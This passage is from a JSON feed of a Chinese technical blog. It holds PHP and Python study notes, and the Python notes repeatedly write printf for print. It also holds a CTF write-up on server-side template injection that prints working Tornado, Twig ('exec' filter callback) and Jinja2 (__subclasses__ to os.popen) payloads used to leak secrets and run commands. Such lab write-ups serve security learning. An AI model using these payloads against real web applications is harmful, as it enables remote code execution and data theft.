data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">#返回类名</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token constant\">__TRAIT__</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">#trait 名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token constant\">__METHOD__</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">#类的方法名，返回该方法被定义时的名字</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token constant\">__NAMESPACE__</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">#当前命名空间的名称</span></pre></td></tr></table></figure><p>18.php 命名空间（namespace）</p>\n<p>PHP 命名空间可以解决以下两类问题：</p>\n<p>1. 用户编写的代码与 PHP 内部的类 / 函数 / 常量或第三方类 / 函数 / 常量之间的名字冲突。<br>\n2. 为很长的标识符名称 (通常是为了缓解第一类问题而定义的) 创建一个别名（或简短）的名称，提高源代码的可读性。</p>\n<p>注意：</p>\n<p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p>\n<hr>\n<p>上面的知识点摘录于<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9waHAvcGhwLXR1dG9yaWFsLmh0bWw=\">菜鸟教程 php</span>，更详细。</p>\n",
            "tags": [
                "php"
            ]
        },
        {
            "id": "http://example.com/2021/06/29/program/py/pystudy/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "url": "http://example.com/2021/06/29/program/py/pystudy/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "title": "python学习中部分易忘知识点",
            "date_published": "2021-06-29T10:41:39.545Z",
            "content_html": "<p>本文是我在 py 学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。</p>\n<p>本文我会不断的学习并总结。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h2 id=\"1不希望出现转义字符起作用在printf中加rr\"><a class=\"anchor\" href=\"#1不希望出现转义字符起作用在printf中加rr\">#</a> 1. 不希望出现转义字符起作用，在 printf () 中加 r/R</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>printf <span class=\"token punctuation\">(</span>r <span class=\"token string\">'hello\\n world'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#但要注意，最后一个字符不能是 \\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>printf <span class=\"token punctuation\">(</span>r 'hello\\n world\\'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#上面的写法是错的</span></pre></td></tr></table></figure><hr>\n<h2 id=\"2将数据输出到文件中去\"><a class=\"anchor\" href=\"#2将数据输出到文件中去\">#</a> 2. 将数据输出到文件中去</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">'D:/text.txt'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'hello world'</span> <span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fp<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><hr>\n<h2 id=\"3相比于c语言多的常用数据类型\"><a class=\"anchor\" href=\"#3相比于c语言多的常用数据类型\">#</a> 3. 相比于 c 语言，多的常用数据类型</h2>\n<p>布尔类型 ——bool (Ture , False)</p>\n<p>字符串类型 ——str (与 c 字符串类似)</p>\n<p>整数类型中：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>printf<span class=\"token punctuation\">(</span><span class=\"token string\">'十进制'</span> <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">#不用加开头</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'二进制'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0b</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 要加开头</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'八进制'</span> <span class=\"token punctuation\">,</span> 0o <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'十六进制'</span> <span class=\"token punctuation\">,</span> 0x <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>浮点数计算中可能出现不精确的情况，另行解决。</p>\n<p>字符串在多换行显示用 ‘’‘xxx’‘’   or   “”“xxx”“”</p>\n<hr>\n<h2 id=\"4print注意\"><a class=\"anchor\" href=\"#4print注意\">#</a> 4.print 注意</h2>\n<p>在一句 printf () 里，不能同时出现多种数据类型，但可以用 str () /int () /  float ()</p>\n<hr>\n<h2 id=\"5计算和定义注意\"><a class=\"anchor\" href=\"#5计算和定义注意\">#</a> 5. 计算和定义注意</h2>\n<p>在 py3 里</p>\n<p>** 表示乘方</p>\n<p>// 表示整除</p>\n<p>数字很大时，可以用下划线来分隔，更清晰易读，py 不会打印下划线</p>\n<p>相比于 c 语言，py 可以这样赋值： x, y, z = 0, 0, 0</p>\n<p>常量一般用全大写表示</p>\n<hr>\n<h2 id=\"6总结一些常用的方法后面遇到的也写到这里了\"><a class=\"anchor\" href=\"#6总结一些常用的方法后面遇到的也写到这里了\">#</a> 6. 总结一些常用的方法（后面遇到的也写到这里了）</h2>\n<p><strong>title()</strong>\t以首字母大写的方式显示每个单词</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada lovelace\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Ada Lovelace</pre></td></tr></table></figure><p><strong>upper()</strong>\t全大写字母显示单词</p>\n<p><strong>lower()</strong>\t全小写字母显示单词</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada lovelace\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ADA LOVELACE</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ada lovelace</pre></td></tr></table></figure><p><strong>format()</strong>\t这个方法在 3.6 以后的版本已经换为用  f 字符  连接字符串了（所以只写了 f 字符的用法）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>first_name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>last_name <span class=\"token operator\">=</span> <span class=\"token string\">\"lovelace\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>full_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>first_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>last_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>full_name<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hello<span class=\"token punctuation\">,</span> Ada Lovelace</pre></td></tr></table></figure><p><strong>rstrip()</strong>\t删除末尾空白</p>\n<p><strong>lstrip()</strong>\t删除开头空白</p>\n<p><strong>strip()</strong>\t 删除字符串两边的空白</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>language_1 <span class=\"token operator\">=</span> <span class=\"token string\">\"python \"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>language_2 <span class=\"token operator\">=</span> <span class=\"token string\">\" python\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>language_1 <span class=\"token operator\">=</span> language_1<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>language_2 <span class=\"token operator\">=</span> language_2<span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>language_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>language_2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>python</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>python</pre></td></tr></table></figure><p><strong>append()</strong>\t在列表末尾添加元素</p>\n<p><strong>insert()</strong>\t\t在列表的任何位置添加元素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phones<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#换行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phones<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'honor'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p><strong>del 语句</strong>\t删除元素，需要知道元素的位置</p>\n<p><strong>pop()</strong>\t\t当需要删除值并接着使用时，用 pop，否则可以用 del 语句删除</p>\n<p><strong>remove()</strong>\t\t根据值删除元素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">del</span> phones<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#换行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>buy <span class=\"token operator\">=</span> phones<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"I will buy </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>buy<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> phone.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>phones<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#remove 有 pop 一样的用法，可以在删除时调用。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#remove 只删除第一次出现的值，如果有多个一样的都需要删除，需要用 while 循环。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>I will buy huawei phone<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span>`</pre></td></tr></table></figure><hr>\n<h2 id=\"7列表相关方法在6\"><a class=\"anchor\" href=\"#7列表相关方法在6\">#</a> 7. 列表（相关方法在 6）</h2>\n<p>普通列表及访问</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#全部打印</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#单个打印</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#索引 - 1 可以访问最后一个</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'oppo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure>",
            "tags": [
                "python"
            ]
        },
        {
            "id": "http://example.com/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "(ctfwp)buu中ssti模板注入",
            "date_published": "2021-06-28T12:51:13.874Z",
            "content_html": "<p>学习文章在前一篇</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"一-护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#一-护网杯-2018easy_tornado\">#</a> 一、[护网杯 2018] easy_tornado</h1>\n<p>打开题目，只有三个链接，如图，</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==\">https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>依次点开</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png\" alt=\"1.2.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png\" alt=\"1.3.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png\" alt=\"1.4.png\"></p>\n<p>根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))\n</code></pre>\n<p>这种格式。</p>\n<p>所以本题的关键在 cookie_secret</p>\n<p>根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。</p>\n<p>我们对网站进行尝试注入，看是否有注入点</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=&#123;&#123;7*7&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png\" alt=\"1.5.png\"></p>\n<p>发现网页报错，但明显还能尝试注入</p>\n<pre><code>error?msg=&#123;&#123;7*7&#125;&#125;    和        error?msg=&#123;&#123;7&#125;&#125;\n</code></pre>\n<p>发现当输入 7*7 时，返回 orz；输入 7 时，返回 7</p>\n<p>说明可以注入，但 * 可能被过滤</p>\n<p>因为存在注入点，所以我们需要寻找 cookie_secret 路径</p>\n<p>百度发现，其存在位置为 handler.settings</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png\" alt=\"1.6.png\"></p>\n<p>进行注入得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png\" alt=\"1.7.png\"></p>\n<pre><code>'cookie_secret': '3b278e82-468b-487a-8cd2-bcf53c8a19d0'&#125;\n</code></pre>\n<p>因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1</p>\n<p>拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png\" alt=\"1.8.png\"></p>\n<p>最后输入 payload 进行查询，得到 flag</p>\n<pre><code>fllllllllllllag&amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png\" alt=\"1.9.png\"></p>\n<p 5d8b767c-07af-46ff-831d-30e9c7f4d32b>flag</p>\n<h1 id=\"二-bjdctf2020cookie-is-so-stable\"><a class=\"anchor\" href=\"#二-bjdctf2020cookie-is-so-stable\">#</a> 二、[BJDCTF2020] Cookie is so stable</h1>\n<p>打开题目，需要输入 id，随便输入后发现找不到 flag</p>\n<p>尝试注入</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==\">https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==\">https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==\">https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>直接百度或根据上一篇文章的 payload 进行注入</p>\n<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;&#123;&#123;_self.env.getFilter(\"cat /flag\")&#125;&#125;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==\">https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3>得 flag</p>\n<h1 id=\"三-gyctf2020flaskapp\"><a class=\"anchor\" href=\"#三-gyctf2020flaskapp\">#</a> 三、[GYCTF2020] FlaskApp</h1>\n<p>进去是这个页面，提示里没有信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==\">https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png</span>&quot; alt=&quot;3.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>随便尝试后，发现加密中可以注入代码，解密就能得到值：</p>\n<p>注入 14 得 e3s3Kzd9fQ== 翻译得 14</p>\n<p>但再注入 49 时，加密得 e3s3Kjd9fQ==</p>\n<p>再解密却得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png\" alt=\"3.2.png\"></p>\n<p>说明存在过滤</p>\n<p>尝试注入查找目录</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png\" alt=\"3.3.png\"></p>\n<p>发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 